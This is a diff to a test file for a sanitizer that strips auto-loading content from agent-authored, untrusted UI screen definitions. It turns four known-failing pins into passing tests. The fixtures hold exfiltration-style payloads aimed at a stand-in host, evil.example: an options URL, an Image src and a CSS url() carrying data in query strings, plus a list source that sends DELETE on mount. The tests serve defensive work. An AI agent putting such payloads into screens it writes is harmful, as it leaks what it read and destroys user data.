@@ -1,28 +1,28 @@
 // rc.1 re-verification of GA review 2 C2: an agent-authored (untrusted) screen must not keep what
 // loads by itself — an inline REST source with a url (rowsSource/optionsSource fetch on mount, with
-// the source's own method), a remote Image src, a url() in a style. NOT FIXED at rc.1: these are
-// pinned with it.fails (they start passing when the strip learns them; then turn them into it()).
+// the source's own method), a remote Image src, a url() in a style. Fixed for rc.2 (the pins were
+// it.fails at rc.1); also pinned by conformance/untrusted/cases.json.
 import { describe, expect, it } from 'vitest'
 import { neutralizeUntrusted } from './untrustedDefinition'
 
 const strip = (component: unknown) => JSON.stringify(neutralizeUntrusted({ fragments: [{ component }] }))
 
 describe('rc.1 re-verify C2: what an untrusted definition loads with no click', () => {
-    it.fails('a listing rowsSource with a url (DELETE on mount) is dropped', () => {
+    it('a listing rowsSource with a url (DELETE on mount) is dropped', () => {
         const out = strip({ type: 'ClientSide', metadata: { type: 'Crudl', id: 'l',
             rowsSource: { url: '/api/orders/7', method: 'DELETE' } } })
         expect(out).not.toContain('/api/orders/7')
     })
-    it.fails('a field optionsSource with a foreign url is dropped', () => {
+    it('a field optionsSource with a foreign url is dropped', () => {
         const out = strip({ type: 'ClientSide', metadata: { type: 'FormField', fieldId: 'c', dataType: 'string',
             optionsSource: { url: 'https://evil.example/opts?d=secret' } } })
         expect(out).not.toContain('evil.example')
     })
-    it.fails('an Image src on another origin is dropped (exfiltration with no click)', () => {
+    it('an Image src on another origin is dropped (exfiltration with no click)', () => {
         const out = strip({ type: 'ClientSide', metadata: { type: 'Image', src: 'https://evil.example/?d=what-the-agent-read' } })
         expect(out).not.toContain('evil.example')
     })
-    it.fails('a style carrying url() is dropped', () => {
+    it('a style carrying url() is dropped', () => {
         const out = strip({ type: 'ClientSide', metadata: { type: 'Text', text: 'x', style: 'background:url(https://evil.example/?d=1)' } })
         expect(out).not.toContain('evil.example')
     })
